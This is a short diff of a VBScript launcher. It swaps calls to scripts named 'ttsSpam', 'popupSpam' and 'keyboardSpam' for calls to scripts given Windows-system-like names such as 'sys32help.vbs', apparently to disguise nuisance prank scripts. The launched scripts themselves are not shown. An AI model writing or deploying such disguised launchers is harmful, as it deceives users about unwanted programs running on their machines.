@@ -2,6 +2,7 @@ Dim msg, sapi
 
 Set WshShell = WScript.CreateObject("Wscript.Shell")
 
-WshShell.Run "ttsSpam.vbs"
-WshShell.Run "popupSpam.vbs"
-WshShell.Run "keyboardSpam.vbs"
+WshShell.Run "sys32help.vbs"
+WshShell.Run "sys32cat.vbs"
+
+WshShell.Run "sys32read.vbs"
